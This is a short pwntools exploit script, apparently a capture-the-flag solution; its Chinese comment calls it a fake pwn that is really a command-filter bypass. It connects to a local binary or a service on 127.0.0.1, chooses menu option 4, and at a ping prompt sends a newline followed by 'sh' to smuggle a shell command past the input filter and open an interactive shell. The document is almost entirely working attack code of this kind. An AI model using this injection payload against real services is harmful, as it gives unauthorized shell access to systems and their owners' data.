# 虚假的 pwn 真正的指令过滤绕过 
from pwn import *

context(arch='amd64',log_level='debug',os='linux',endian='little')

p = process('./pwn')
p = remote('127.0.0.1',61234)

p.recvuntil(b'ce: ')
p.sendline(b'4')
p.recvuntil(b'ping: ')
p.sendline(b'\nsh\n')
p.interactive()